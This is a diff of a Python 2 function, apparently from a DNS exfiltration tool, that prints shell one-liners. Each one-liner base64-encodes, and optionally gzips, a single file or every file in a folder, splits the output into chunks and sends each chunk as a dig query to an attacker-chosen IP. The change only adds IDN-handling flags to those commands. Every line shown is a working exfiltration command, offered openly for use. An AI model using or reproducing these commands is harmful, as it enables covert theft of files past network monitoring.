@@ -132,17 +132,17 @@ def p_cmds(s,b,ip,z):
 
 	if (z):
 		print "%s[?]%s Copy individual file (ZIP enabled)" % (c["y"], c["e"])
-		print """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done """ % (c["r"], c["e"], c["y"], c["e"], s, b, ip )
+		print """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short +noidnin +noidnout; done """ % (c["r"], c["e"], c["y"], c["e"], s, b, ip )
 		print
 		print "%s[?]%s Copy entire folder (ZIP enabled)" % (c["y"], c["e"])
-		print """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done ; done""" % (c["r"], c["e"], s, b, ip )
+		print """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short +noidnin +noidnout; done ; done""" % (c["r"], c["e"], s, b, ip )
 		print
 	else:
 		print "%s[?]%s Copy individual file" % (c["y"], c["e"])
-		print """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0; for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done """ % (c["r"], c["e"], c["y"], c["e"], s, b, ip )
+		print """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0; for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short +noidnin +noidnout; done """ % (c["r"], c["e"], c["y"], c["e"], s, b, ip )
 		print
 		print "%s[?]%s Copy entire folder" % (c["y"], c["e"])
-		print """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0; for r in $(for i in $(base64 -w0 $f | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done ; done""" % (c["r"], c["e"], s, b, ip )
+		print """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0; for r in $(for i in $(base64 -w0 $f | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short +noidnin +noidnout; done ; done""" % (c["r"], c["e"], s, b, ip )
 		print
 		
 
